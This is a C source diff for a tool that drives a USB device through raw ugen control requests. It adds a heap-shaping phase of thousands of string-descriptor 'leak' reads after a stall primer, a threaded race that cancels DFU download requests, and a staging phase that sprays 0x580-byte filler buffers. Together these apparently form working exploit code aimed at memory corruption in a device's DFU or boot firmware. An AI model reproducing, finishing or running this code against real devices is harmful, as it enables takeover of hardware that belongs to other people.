@@ -144,10 +144,121 @@ battery(int fd, int count)
 	}
 }
 
+/* Reference phase-1 replica: prelude, hammer primer, the full leak run. */
+static int
+phase1_replica(int fd)
+{
+	int i, dead = 0;
+
+	for (i = 0; i < 4; i++)
+		do_req(fd, "[P1] prelude", 0x80, 6, 0x0304, 0x040a, 0x40, 100);
+	stall_hammer(fd);
+	for (i = 0; i < 7936; i++) {
+		char tag[32];
+
+		snprintf(tag, sizeof(tag), "[L] leak %d", i);
+		set_timeout(fd, 100);
+		errno = 0;
+		{
+			struct usb_ctl_request req;
+			char data[64];
+			int rc;
+
+			memset(&req, 0, sizeof(req));
+			req.ucr_request.bmRequestType = 0x80;
+			req.ucr_request.bRequest = 6;
+			USETW(req.ucr_request.wValue, 0x0304);
+			USETW(req.ucr_request.wIndex, 0x040a);
+			USETW(req.ucr_request.wLength, 0x40);
+			req.ucr_data = data;
+			rc = ioctl(fd, USB_DO_REQUEST, &req);
+			if (rc != 0 && ++dead > 8) {
+				printf("[L] heap lost at leak %d (errno=%d)\n", i, errno);
+				return -1;
+			}
+			if (rc == 0)
+				dead = 0;
+		}
+	}
+	do_req(fd, "[L] no_leak", 0x80, 6, 0x0304, 0x040a, 0x41, 100);
+	printf("[P1] phase 1 replica complete\n");
+	return 0;
+}
+
+struct dn_ctx {
+	int fd;
+	volatile int started;
+	volatile int done;
+	int ret;
+	int err;
+};
+
+static void *
+dn_thread(void *arg)
+{
+	struct dn_ctx *c = arg;
+	struct usb_ctl_request req;
+	static char buf[0x800];
+
+	memset(&req, 0, sizeof(req));
+	req.ucr_request.bmRequestType = 0x21;
+	req.ucr_request.bRequest = 1;
+	USETW(req.ucr_request.wValue, 0);
+	USETW(req.ucr_request.wIndex, 0);
+	USETW(req.ucr_request.wLength, 0x800);
+	req.ucr_data = buf;
+	c->started = 1;
+	c->ret = ioctl(c->fd, USB_DO_REQUEST, &req);
+	c->err = errno;
+	c->done = 1;
+	return NULL;
+}
+
+/* Hammer-cancel a 0x800 DNLOAD, optionally after a wire delay. */
+static void
+abort_dnload(int fd, unsigned delay_us)
+{
+	struct dn_ctx c;
+	pthread_t th;
+	long t0;
+
+	memset(&c, 0, sizeof(c));
+	c.fd = fd;
+	set_timeout(fd, 5000);
+	if (pthread_create(&th, NULL, dn_thread, &c) != 0)
+		return;
+	while (!c.started)
+		;
+	t0 = now_us();
+	while (now_us() - t0 < delay_us)
+		;
+	while (!c.done)
+		(void)ioctl(fd, USB_ABORT_REQUEST);
+	pthread_join(th, NULL);
+	printf("[S] abort-dnload(delay=%uus) r=%d errno=%d %ldus\n",
+	    delay_us, c.ret, c.err, now_us() - t0);
+}
+
+/* Phase-2 staging matrix on a heap that phase 1 shaped correctly. */
+static void
+phase2_matrix(int fd)
+{
+	static char filler[0x580];
+
+	memset(filler, 'A', sizeof(filler));
+	abort_dnload(fd, 0);
+	do_req(fd, "[S] filler (0,0) 0x580", 0, 0, 0, 0, 0x580, 10);
+	do_req(fd, "[S] filler DNLOAD 0x580", 0x21, 1, 0, 0, 0x580, 100);
+	do_req(fd, "[S] clr", 0x21, 4, 0, 0, 0, 100);
+	abort_dnload(fd, 0);
+	do_req(fd, "[S] filler (0,0) 0x580 #2", 0, 0, 0, 0, 0x580, 10);
+	do_req(fd, "[S] clr #2", 0x21, 4, 0, 0, 0, 100);
+}
+
 int
 main(int argc, char **argv)
 {
-	int fd, variant, i, n;
+	int fd, variant, i;
 
 	if (argc < 3) {
 		fprintf(stderr, "usage: %s /dev/ugenN.00 variant\n", argv[0]);
@@ -175,14 +286,10 @@ main(int argc, char **argv)
 		battery(fd, 24);
 		break;
 	default:
-		/* Baseline compensation: N string reads before the
-		 * hammer primer, then the leak battery. */
-		n = 2 << (variant - 2);
-		for (i = 0; i < n; i++)
-			do_req(fd, "[P] prelude read", 0x80, 6, 0x0304, 0x040a, 0x40, 100);
-		printf("[P] %d prelude reads done\n", n);
-		stall_hammer(fd);
-		battery(fd, 12);
+		/* Phase-2 laboratory: reference phase-1 replica, then the
+		 * staging matrix. */
+		if (phase1_replica(fd) == 0)
+			phase2_matrix(fd);
 		break;
 	}
 
